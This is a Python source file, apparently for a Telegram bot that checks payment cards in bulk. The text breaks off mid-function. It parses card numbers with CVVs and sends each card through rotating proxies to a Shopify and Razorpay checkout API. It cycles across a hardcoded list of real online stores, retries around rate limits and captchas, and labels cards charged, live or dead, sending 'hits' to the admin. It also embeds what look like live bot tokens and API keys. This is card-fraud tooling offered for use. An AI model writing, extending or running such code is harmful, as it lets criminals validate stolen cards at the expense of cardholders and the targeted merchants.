from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import re
import json
import sqlite3
import secrets
import string
from datetime import datetime, timedelta
from telethon.errors import FloodWaitError
from PIL import Image, ImageDraw, ImageFont
from aiohttp_socks import ProxyConnector
import pytz
import urllib.parse

# ===================== MULTIPLE SHOPIFY APIS =====================
SHOPIFY_APIS = [
    "https://afunx-0cece6049c30.herokuapp.com/shopify"
]

def get_api():
    return random.choice(SHOPIFY_APIS)

# Bot Configuration
API_ID = 21124241
API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
BOT_TOKEN = '8967544580:AAGwKzj6P2KHSDHiNqkZASc9RrLiVVLBf6I'
ADMIN_ID = 6124760730
KEY_ADMINS = {6124760730}

# Channel configuration
CHANNEL_ID = -1003681098722
CHANNEL_USERNAME = "Scrshopibot"

# File paths
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'shopixsites.txt'
MULTI_KEYS_FILE = 'multi_device_keys.json'
PROXY_FILE = 'proxy.txt'
VERIFIED_FILE = "verified_users.txt"
USER_SITES_FILE = 'user_sites.json'
USER_PROXY_FILE = 'user_proxies.json'
KEYS_FILE = "keys.txt"
BLOCK_FILE = "blocked_users.txt"
DAILY_USAGE_FILE = "daily_usage.json"
RZ_SITES_FILE = 'rz_sites.txt'
PHOTO_URL = "https://i.postimg.cc/htbx1g5P/orion.png"

# Initialize bot
bot = TelegramClient('lll-forit--babu_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# RAZORPAY CONFIG
RAZORPAY_FIXED_SITE = "https://pages.razorpay.com/BusinessGarh"
RAZORPAY_API_BASE = "https://auto-razorpay-nano.vercel.app/hit"

# ===================== SHOPIFY FIXED SITES (defined BEFORE use) =====================
SHOPIFY_FIXED_SITES = [
    "https://paperieplanning.com",
    "https://punisher.myshopify.com",
    "https://dev-goodybeads.myshopify.com",
    "https://blackhelmetapparel.com",
    "https://magneticjewelrysupply.myshopify.com",
    "https://kingdomcomecards.com",
    "https://www.localsonlygiftsandgoods.com",
    "https://www.allways99pr.com",
    "https://store.otdefense.com",
    "https://www.anchorproteinchips.com",
    "https://bazicproducts.com",
    "https://saavy-naturals.myshopify.com",
    "https://darkroomgrowlabs.com",
    "https://theheadnut.com",
    "https://dreamingoftheseafabrics.com",
    "https://official-chest-binder.myshopify.com",
    "https://sugarnspiceartworks.myshopify.com",
    "https://schoolsupplyboxes.com",
    "https://buycutepix.com",
    "https://challengecoinnation.com",
    "https://make-it-rc.myshopify.com",
    "https://cjstickershop.com",
    "https://stacywong.myshopify.com",
    "https://moogoo-usa.myshopify.com",
    "https://pipsticks.com",
    "https://littlethingsstudio.com",
    "https://vacation-races-merchandise.myshopify.com",
    "https://rucci.com",
    "https://the-wood-shape-store.myshopify.com",
    "https://m22.com",
    "https://freckled-pear.myshopify.com",
    "https://all-travel-sizes.myshopify.com",
    "https://bounce-mkt.myshopify.com",
    "https://bughunterbug.com",
    "https://a-lot-mall.myshopify.com",
    "https://blocki.myshopify.com",
    "https://hustleandflowsco.myshopify.com",
    "https://peanutsplannerco.com",
    "https://planetpawsshop.com",
    "https://mous.co",
    "https://kitchencrop.com",
    "https://shopwhoi.myshopify.com",
    "https://forwardfruitdesign.com",
    "https://pagergenius.com",
    "https://annemjewelry.com",
    "https://holiday-hack.myshopify.com",
    "https://mariescandies.com",
    "https://alleven.com",
]

# ===================== SEMAPHORES FOR CONCURRENCY =====================
_USER_SEMS = {}
_GLOBAL_GATE_SEMS = {}
_GATE_BUDGET = {'SHOPIFY': 500, 'RAZORPAY': 20, 'AUTH': 60, 'CHARGED': 120, 'PAYPAL': 40}
_USER_SEMS_LOCK = asyncio.Lock()

async def get_user_semaphore(uid: int, gate_type: str) -> asyncio.Semaphore:
    async with _USER_SEMS_LOCK:
        if uid not in _USER_SEMS:
            _USER_SEMS[uid] = {}
        if gate_type not in _USER_SEMS[uid]:
            _USER_SEMS[uid][gate_type] = asyncio.Semaphore(_GATE_BUDGET.get(gate_type, 40))
        return _USER_SEMS[uid][gate_type]

async def get_global_semaphore(gate_type: str) -> asyncio.Semaphore:
    async with _USER_SEMS_LOCK:
        if gate_type not in _GLOBAL_GATE_SEMS:
            _GLOBAL_GATE_SEMS[gate_type] = asyncio.Semaphore(_GATE_BUDGET.get(gate_type, 40))
        return _GLOBAL_GATE_SEMS[gate_type]

# ===================== DEAD INDICATORS =====================
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'request timeout', 'connection refused', 'connection reset',
    'site error', 'too many requests', '429', 'rate limit',
)

_RETRY_KEYWORDS = (
    'request timeout', 'timeout', 'connection failed',
    'connection refused', 'connection reset', 'site dead',
    'site error', 'error in 1st req', 'invalid url',
    'cloudflare', 'captcha_required', 'access denied',
    'tlsv1 alert', 'ssl routines', 'could not resolve',
    'domain name not found', 'name or service not known',
    'openssl ssl_connect', 'empty reply from server',
    'httperror504', 'http error', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'failed to detect product',
    'failed to create checkout', 'failed to tokenize card',
    'failed to get proposal data', 'submit rejected',
    'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small',
    'amount too small', 'all products sold out', 'no_session_token',
    'tokenize_fail', 'too many requests', '429', 'rate limit',
    'required_artifacts_unavailable',
    'validation_custom', 'merchandise_out_of_stock',
    'payments_payment_flexibility_terms_id_mismatch',
    'payments_proposed_gateway_unavailable', 'processing_error',
    'decision_rule_block', 'still_processing',
)

_KILL_KEYWORDS = (
    'site throttled', 'status: 429', '429',
    'no valid payment method found',
    'delivery_no_delivery_strategy_available',
    'error:\n', 'requires login', 'require login',
    'login required', 'please log in', 'please sign in',
    'sign in to continue', 'required_artifacts_unavailable',
    'validation_custom', 'merchandise_out_of_stock',
    'payments_payment_flexibility_terms_id_mismatch',
    'payments_proposed_gateway_unavailable', 'processing_error',
    'decision_rule_block', 'still_processing',
)

def is_dead_site_error(msg):
    if not msg: return True
    msg = str(msg).lower()
    return any(x in msg for x in _DEAD_INDICATORS)

def is_dead_error(msg):
    if not msg: return True
    msg = str(msg).lower()
    return any(x in msg for x in _DEAD_INDICATORS)

def is_retry_error(msg: str) -> bool:
    if not msg: return True
    msg = msg.lower()
    return any(k in msg for k in _RETRY_KEYWORDS)

def is_kill_error(msg: str) -> bool:
    if not msg: return False
    msg = msg.lower()
    return any(k in msg for k in _KILL_KEYWORDS)

# ===================== PREMIUM EMOJI SYSTEM =====================
PREMIUM_EMOJI_IDS = {
    "⚡": "5444860552310457690",
    "🔥": "5121063440311386962",
    "💎": "5219943216781995020",
    "👑": "5971944878815317190",
    "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495",
    "🌟": "6298678524379137990",
    "📊": "5971944878815317190",
    "📶": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971944878815317190",
    "⏳": "5971944878815317190",
    "🚀": "6282977077427702833",
    "⚡️": "5420323339723881652",
    "💠": "5343636681473935403",
    "🔅": "5447387942995655277",
    "💰": "5283232570660634549",
    "🤩": "6267091732861555879",
    "✔️": "6206479140040743133",
    "⭐": "5447387942995655277",
    "💳": "5447453226498552490",
    "🏧": "4967738760021148319",
    "🔗": "4958689671950369798",
    "🫥": "5325731315004218660",
    "⏱": "5382194935057372936",
    "⚠️": "5042334757040423886",
    "👇": "5373346752671804066",
    "👆": "5231102735817918643",
    "🔒": "5393302369024882368",
    "🛒": "5447387942995655277",
    "📠": "5796407074346767851",
    "🔑": "5870972873450984431",
    "📞": "6093587384954262033",
    "🆘": "5256143829672672750",
    "👤": "5346136537123801643",
    "🆔": "5890864241388293875",
    "📅": "5235895962269935073",
    "🔙": "5445365692004071819",
    "🤖": "5355051922862653659",
    "💥": "5219901967916084166",
    "🌐": "5445326466067754897",
    "🎯": "5463274047771000031",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# ===================== GIFT VIDEOS =====================
_HIT_GIFT_PATHS = [
    'hit_gift.mp4', 'gift_1.mp4', 'gift_2.mp4', 'gift_3.mp4',
    'gift_4.mp4', 'gift_5.mp4', 'gift_6.mp4', 'gift_7.mp4',
    'gift_8.mp4', 'gift_9.mp4'
]
_hit_gift_fids = {}

# ===================== CORE FUNCTIONS =====================
last_click = {}
active_sessions = {}
user_check_locks = {}

def save_user(user_id):
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("""CREATE TABLE IF NOT EXISTS users 
                         (user_id INTEGER PRIMARY KEY)""")
        cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
    except:
        pass

def is_admin(user_id):
    return user_id == ADMIN_ID or user_id in KEY_ADMINS

def is_premium(user_id):
    if not os.path.exists(PREMIUM_FILE):
        return False
    valid = []
    user_id_str = str(user_id)
    found = False
    try:
        with open(PREMIUM_FILE, "r", encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    uid, exp_str = line.split("|", 1)
                    exp_str = exp_str.strip()
                    if ":" in exp_str:
                        exp = datetime.strptime(exp_str, "%Y-%m-%d %H:%M:%S")
                    else:
                        exp = datetime.strptime(exp_str, "%Y-%m-%d")
                        exp = exp.replace(hour=23, minute=59, second=59)
                    if exp > datetime.now():
                        valid.append(line)
                        if uid == user_id_str:
                            found = True
                except:
                    pass
    except:
        return False
    try:
        with open(PREMIUM_FILE, "w", encoding='utf-8') as f:
            f.write("\n".join(valid) + ("\n" if valid else ""))
    except:
        pass
    return found

def is_blocked(user_id):
    try:
        with open(BLOCK_FILE, "r") as f:
            blocked = f.read().splitlines()
        return str(user_id) in blocked
    except:
        return False

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_sites():
    sites = get_file_lines(SITES_FILE)
    if sites:
        return sites
    return SHOPIFY_FIXED_SITES

def load_proxies():
    return get_file_lines(PROXY_FILE)

def get_daily_usage(user_id):
    if not os.path.exists(DAILY_USAGE_FILE):
        return {"cc_count": 0, "date": datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()}
    try:
        with open(DAILY_USAGE_FILE, "r") as f:
            data = json.load(f)
        today = datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()
        if str(user_id) not in data or data[str(user_id)]["date"] != today:
            data[str(user_id)] = {"cc_count": 0, "date": today}
        return data[str(user_id)]
    except:
        return {"cc_count": 0, "date": datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()}

def update_daily_usage(user_id, cc_count=1):
    data = {}
    if os.path.exists(DAILY_USAGE_FILE):
        with open(DAILY_USAGE_FILE, "r") as f:
            data = json.load(f)
    today = datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()
    if str(user_id) not in data or data[str(user_id)]["date"] != today:
        data[str(user_id)] = {"cc_count": 0, "date": today}
    data[str(user_id)]["cc_count"] += cc_count
    with open(DAILY_USAGE_FILE, "w") as f:
        json.dump(data, f)

def check_limits(user_id, is_bulk=False):
    if is_admin(user_id) or is_premium(user_id):
        return True, 999999
    usage = get_daily_usage(user_id)
    if is_bulk:
        return usage["cc_count"] < 50000, 50000
    return usage["cc_count"] < 150, 150 - usage["cc_count"]

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except:
                    return '-', '-', '-', '-', '-', ''
    except:
        return '-', '-', '-', '-', '-', ''

# ===================== CHECK CARD =====================
async def check_card(card: str, site: str, proxy: str, req_timeout: int = 60) -> dict:
    if '://' in proxy:
        proxy = proxy.split('://', 1)[1]
    try:
        api_url = get_api()
        params = {'site': site, 'cc': card, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=req_timeout)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url, params=params) as resp:
                raw = await resp.json(content_type=None)
        if not isinstance(raw, dict):
            return {
                'status': 'Site Error',
                'message': 'Invalid API response format',
                'card': card,
                'retry': True,
                'gateway': 'Shopify Payments',
                'price': '-',
                'site': site
            }
        resp_text = raw.get('Response', raw.get('response', ''))
        if not resp_text:
            resp_text = raw.get('message', raw.get('error', raw.get('status', '')))
            if not resp_text:
                resp_text = 'Unknown Error (no response field)'
        price = raw.get('Price', raw.get('Amount', '-'))
        gate = raw.get('Gate', raw.get('Gateway', 'Shopify Payments'))
        st = raw.get('Status', raw.get('status', False))
        if isinstance(st, str):
            st = st.lower() in ('true', 'charged', 'success', 'approved')
        charged = st or str(raw.get('Charged', 'False')).strip().lower() == 'true'
        approved = str(raw.get('Approved', 'False')).strip().lower() == 'true'
        
        if any(k in resp_text.lower() for k in ('requires login', 'require login', 'login required', 'please log in', 'please sign in', 'sign in to continue')):
            return {
                'status': 'Site Error',
                'message': resp_text,
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price,
                'site': site,
                'kill': True
            }
        if is_dead_site_error(resp_text):
            return {
                'status': 'Site Error',
                'message': resp_text,
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price,
                'site': site
            }
        if charged:
            return {
                'status': 'Charged',
                'message': resp_text,
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }
        if any(k in resp_text.lower() for k in ('3ds', '3d_secure', 'otp', 'two_factor', 'authenticate', 'challenge', 'verification_required')):
            return {
                'status': 'OTP',
                'message': resp_text,
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }
        if approved or any(k in resp_text.lower() for k in ('insufficient', 'funds', 'insufficient funds')):
            return {
                'status': 'Approved',
                'message': resp_text,
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price,
                'retry': False
            }
        if gate.lower().strip() == 'unknown':
            return {
                'status': 'Site Error',
                'message': resp_text,
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price,
                'site': site
            }
        return {
            'status': 'Dead',
            'message': resp_text,
            'card': card,
            'site': site,
            'gateway': gate,
            'price': price,
            'retry': False
        }
    except asyncio.TimeoutError:
        return {
            'status': 'Site Error',
            'message': 'Timeout',
            'card': card,
            'retry': True,
            'site': site,
            'gateway': 'Shopify Payments',
            'price': '-'
        }
    except Exception as e:
        return {
            'status': 'Site Error' if is_dead_error(str(e)) else 'Dead',
            'message': str(e),
            'card': card,
            'retry': is_dead_error(str(e)),
            'site': site,
            'gateway': 'Shopify Payments',
            'price': '-'
        }

async def check_card_with_retry(card: str, sites: list, proxies: list, max_retries: int = 6) -> dict:
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Shopify Payments', 'price': '-', 'site': None}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Shopify Payments', 'price': '-', 'site': None}
    used_sites = set()
    used_proxies = set()
    last_result = None
    for attempt in range(max_retries):
        available_sites = [s for s in sites if s not in used_sites]
        if not available_sites:
            break
        site = random.choice(available_sites)
        used_sites.add(site)
        available_proxies = [p for p in proxies if p not in used_proxies]
        if not available_proxies:
            available_proxies = proxies
        proxy = random.choice(available_proxies)
        used_proxies.add(proxy)
        result = await check_card(card, site, proxy)
        last_result = result
        retry = result.get('retry', False)
        if not retry:
            return result
        if result.get('kill', False) or is_kill_error(result.get('message', '')):
            try:
                sites.remove(site)
            except ValueError:
                pass
    if last_result:
        return {
            'status': 'Dead',
            'message': f"All {max_retries} retries failed. Last: {last_result.get('message', '')}",
            'card': card,
            'gateway': 'Shopify Payments',
            'price': '-',
            'site': None
        }
    else:
        return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Shopify Payments', 'price': '-', 'site': None}

def load_razorpay_sites():
    return [RAZORPAY_FIXED_SITE]

# ===================== GIFT SENDING =====================
async def send_gift_video(uid: int, card: str, caption: str):
    try:
        for path in _HIT_GIFT_PATHS:
            if os.path.exists(path):
                if path in _hit_gift_fids:
                    file_id = _hit_gift_fids[path]
                    await bot.send_video(uid, file_id, caption=caption, parse_mode='html', buttons=kb_bot_link())
                else:
                    msg = await bot.send_video(uid, path, caption=caption, parse_mode='html', buttons=kb_bot_link())
                    if msg.video:
                        _hit_gift_fids[path] = msg.video.file_id
                return True
        return False
    except Exception as e:
        print(f"Gift video error: {e}")
        return False

# ===================== COPY BUTTON =====================
def kb_copy(card: str) -> list:
    encoded = urllib.parse.quote(card)
    return [[Button.url("📋 ᴄᴏᴘʏ ᴄᴄ", f"tg://copy?text={encoded}")]]

# ===================== BOT LINK BUTTON =====================
def kb_bot_link():
    return [[Button.url("◢◤◢◤shopiixprobot◤◢◤◢", "https://t.me/foritxshopi_bot")]]

# ===================== MASS CHECK SHOPIFY =====================
async def run_mass_shopify(uid: int, msg: object, cards: list, sites: list, proxies: list, from_user=None):
    total = len(cards)
    uname = from_user.first_name if from_user else "User"
    active_sites = list(sites)
    active_proxies = list(proxies)
    results = {
        'charged': [],
        'approved': [],
        'otp': [],
        'dead': [],
        'total': total,
        'checked': 0,
        'start_time': time.time()
    }
    queue = asyncio.Queue()
    for card in cards:
        await queue.put(card)
    msg_id = msg.id
    user_sem = await get_user_semaphore(uid, 'SHOPIFY')
    global_sem = await get_global_semaphore('SHOPIFY')
    last_update_time = time.time()
    update_interval = 0.5

    async def update_progress_shopify():
        nonlocal last_update_time
        while results['checked'] < total:
            now = time.time()
            if now - last_update_time >= update_interval:
                last_update_time = now
                elapsed = now - results['start_time']
                cps = results['checked'] / elapsed if elapsed > 0 else 0
                last_card = ""
                last_resp = ""
                if results.get('last_result'):
                    last_card = results['last_result'].get('card', '')
                    last_resp = results['last_result'].get('message', '')[:60]
                await update_progress(uid, msg_id, results, results['checked'], uname, is_razorpay=False, last_card=last_card, last_resp=last_resp, cps=cps, elapsed=elapsed)
            await asyncio.sleep(0.2)

    async def worker():
        while True:
            try:
                card = await asyncio.wait_for(queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                break
            async with global_sem:
                async with user_sem:
                    result = await check_card_with_retry(card, active_sites, active_proxies, max_retries=6)
                    results['last_result'] = result
                    if result['status'] == 'Charged':
                        results['charged'].append(result)
                        await send_hit_to_admin(result, uid, 'Charged')
                        await send_realtime_hit_group(uid, result, 'Charged', uname)
                        await send_realtime_hit_dm(uid, result, 'Charged', uname)
                        await auto_pin_charged(uid, result)
                    elif result['status'] == 'Approved':
                        results['approved'].append(result)
                        await send_hit_to_admin(result, uid, 'Approved')
                        await send_realtime_hit_dm(uid, result, 'Approved', uname)
                    elif result['status'] == 'OTP':
                        results['otp'].append(result)
                    else:
                        results['dead'].append(result)
                    results['checked'] += 1
                    await update_daily_usage(uid, 1)
                    queue.task_done()

    progress_task = asyncio.create_task(update_progress_shopify())
    worker_count = _GATE_BUDGET.get('SHOPIFY', 50)
    workers = [asyncio.create_task(worker()) for _ in range(worker_count)]
    await queue.join()
    for w in workers:
        w.cancel()
    await asyncio.gather(*workers, return_exceptions=True)
    progress_task.cancel()
    await send_final_results(uid, results)

# ===================== UPDATE PROGRESS (style= FIXED) =====================
async def update_progress(user_id, message_id, results, current_attempt_count, first_name="User", is_razorpay=False, last_card="", last_resp="", cps=0.0, elapsed=0.0):
    ist = pytz.timezone('Asia/Kolkata')
    now = datetime.now(ist)
    current_time = now.strftime("%I:%M:%S %p IST")
    charged = len(results.get('charged', []))
    approved = len(results.get('approved', []))
    otp = len(results.get('otp', []))
    dead = len(results.get('dead', []))
    errors = results.get('errors', 0)
    total = results.get('total', 0)
    checked = current_attempt_count
    percentage = round((checked / total) * 100, 1) if total > 0 else 0
    gateway = "ʀᴀᴢᴏʀᴘᴀʏ" if is_razorpay else "ꜱʜᴏᴘɪꜰʏ"
    
    if not last_card and results.get('last_result'):
        last_result = results['last_result']
        last_card = last_result.get('card', '—')
        last_resp = str(last_result.get('message', '—'))[:60]
    
    user_plan = "💎 Premium" if is_premium(user_id) else "👑 Admin" if is_admin(user_id) else "⭐ Free"
    
    m, s = divmod(int(elapsed), 60)
    elapsed_str = f"{m}m{s:02d}s" if m else f"{s}s"
    cps_str = f"{cps:.1f}" if cps >= 0.1 else "—"

    text = f"""<b>⚡ ◢◤◢◤shopiixprobot◤◢◤◢ ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>💥 ɢᴀᴛᴇᴡᴀʏ ▸ {gateway}</b>
<b>🔄 ᴘʀᴏᴄᴇꜱꜱ ▸ ᴄʜᴇᴄᴋɪɴɢ...</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔗 Process▸ <code>{percentage}%</code> | <code>{checked}/{total}</code></b>
<b>💳 CC ▸ <code>{last_card}</code></b>
<b>⚡ Speed ▸ <code>{cps_str} cc/s</code></b>
<b>⏱️ Elapsed ▸ <code>{elapsed_str}</code></b>
<b>❗ Res ▸ <code>{last_resp}</code></b>
━━━━━━━━━━━━━━━━━━━━
<b>✅ ᴀᴘᴘʀᴏᴠᴇᴅ ▸ {approved}</b>
<b>💰 ᴄʜᴀʀɢᴇᴅ ▸ {charged}</b>
<b>🔐 ᴏᴛᴘ ▸ {otp}</b>
<b>❗ ᴅᴇᴀᴅ ▸ {dead}</b>
<b>⚠️ ᴇʀʀᴏʀ ▸ {errors}</b>
<b>⏳ ᴛɪᴍᴇ ▸ {current_time}</b>  
━━━━━━━━━━━━━━━━━━━━
<b>👤 ᴜsᴇʀ ɴᴀᴍᴇ ▸ <a href="tg://user?id={user_id}">{first_name}</a> [{user_plan}]</b>
<b>🤖 ʙᴏᴛ ɴᴀᴍᴇ ▸ <a href="tg://user?id=8823705089">◢◤◢shopiixprobot◤◢◤◢</a></b>"""

    buttons = [
        [
            Button.inline(f"💰 ᴄʜᴀʀɢᴇᴅ ({charged})", f"charged_{message_id}".encode()),
            Button.inline(f"🔍 ʟɪᴠᴇ ({approved})", f"live_{message_id}".encode())
        ],
        [
            Button.inline("🔄 ʀᴇꜰʀᴇꜱʜ", f"refresh_{message_id}".encode()),
            Button.inline("🛑 ᴅᴇᴀᴅ", f"stop_{message_id}".encode())
        ]
    ]

    try:
        await bot.edit_message(
            user_id, 
            message_id, 
            premium_emoji(text), 
            buttons=buttons, 
            parse_mode="html"
        )
    except Exception:
        pass

# ===================== SEND FINAL RESULTS =====================
async def send_final_results(chat_id, results):
    if not results or not isinstance(results, dict):
        results = {'charged': [], 'approved': [], 'otp': [], 'dead': [], 'error_cards': [], 'api_errors': 0, 'errors': 0, 'total': 0, 'start_time': time.time()}
    if 'start_time' not in results:
        results['start_time'] = time.time()
    error_count = len(results.get('error_cards', []))
    api_error_count = results.get('api_errors', 0)
    if 'total' not in results:
        results['total'] = len(results.get('charged', [])) + len(results.get('approved', [])) + len(results.get('otp', [])) + len(results.get('dead', [])) + error_count
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    hits_text = ""
    if results.get('charged'):
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results.get('approved'):
        for r in results['approved'][:5]:
            hits_text += f"🔍 <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "No hits found"
    gateway = "ꜱʜᴏᴘɪꜰʏ ᴘᴀʏᴍᴇɴᴛꜱ"
    price = "0.00"
    if results.get("charged"):
        gateway = results["charged"][0].get("gateway", "ꜱʜᴏᴘɪꜰʏ ᴘᴀʏᴍᴇɴᴛꜱ")
        price = results["charged"][0].get("price", "-")
    elif results.get("approved"):
        gateway = results["approved"][0].get("gateway", "ꜱʜᴏᴘɪꜰʏ ᴘᴀʏᴍᴇɴᴛꜱ")
        price = results["approved"][0].get("price", "-")
    summary = f"""<b>⚡💳 ⎝ꜱʜᴏᴘɪꜰʏ ᴘᴀʏᴍᴇɴᴛꜱ⎠ 💳⚡</b>
<b>━━━━━━━━━━━━━━━━</b>
<b>⚡💠 ꜱᴜᴍᴍᴀʀʏ</b>
<blockquote>💳 Total: {results.get('total', 0)} | ✅ Charged: {len(results.get('charged', []))} | 🔍 Live: {len(results.get('approved', []))} | 🔐 OTP: {len(results.get('otp', []))} | ❗ Dead: {len(results.get('dead', []))} | ⚠️ Error: {error_count}</blockquote>
<blockquote>🌐 ɢᴀᴛᴇᴡᴀʏ ⇾ 🔍 {gateway} | 💠 {price}</blockquote> 
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━</b>
<b>🎯💠 ʜɪᴛꜱ</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: <a href="tg://user?id=8823705089">◢◤◢◤shopiixprobot◤◢◤◢</a></b>"""
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"Checker_Result_{chat_id}_{timestamp}.txt"
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 CC CHECKER FINAL RESULTS 💳⚡\n")
        await f.write("=" * 70 + "\n\n")
        await f.write(f"📊 SUMMARY\n")
        await f.write(f"Total Cards: {results.get('total', 0)}\n")
        await f.write(f"✅ Charged: {len(results.get('charged', []))}\n")
        await f.write(f"🔍 Approved: {len(results.get('approved', []))}\n")
        await f.write(f"🔐 OTP: {len(results.get('otp', []))}\n")
        await f.write(f"❗ Dead: {len(results.get('dead', []))}\n")
        await f.write(f"⚠️ Errors: {error_count}\n")
        await f.write(f"⏱️ Time: {hours}h {minutes}m {seconds}s\n")
        await f.write(f"🌐 Gateway: {gateway}\n")
        await f.write(f"💠 Price: {price}\n")
        await f.write("=" * 70 + "\n\n")
        if results.get('charged'):
            await f.write(f"✅ CHARGED ({len(results.get('charged', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('charged', []):
                await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]}\n")
            await f.write("\n")
        if results.get('approved'):
            await f.write(f"🔍 APPROVED ({len(results.get('approved', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('approved', []):
                await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]}\n")
            await f.write("\n")
        if results.get('otp'):
            await f.write(f"🔐 OTP ({len(results.get('otp', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('otp', []):
                await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]}\n")
            await f.write("\n")
        if results.get('dead'):
            await f.write(f"❗ DEAD ({len(results.get('dead', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('dead', []):
                await f.write(f"{r.get('card', '')} | {r.get('gateway', '')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]}\n")
            await f.write("\n")
        error_cards = results.get('error_cards', [])
        if error_cards:
            await f.write(f"⚠️ ERRORS ({len(error_cards)}):\n")
            await f.write("-" * 70 + "\n")
            for r in error_cards:
                error_msg = str(r.get('message', 'Unknown Error'))[:500]
                await f.write(f"{r.get('card', '')} | {r.get('gateway', '')} | {r.get('price', '-')} | {error_msg}\n")
    try:
        await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode="html")
    except Exception as e:
        print(f"Send final error: {e}")
        await bot.send_message(chat_id, premium_emoji(summary), parse_mode="html")
    try: os.remove(filename)
    except: pass

# ===================== SEND HIT FUNCTIONS =====================
async def send_hit_to_admin(result, user_id, hit_type):
    try:
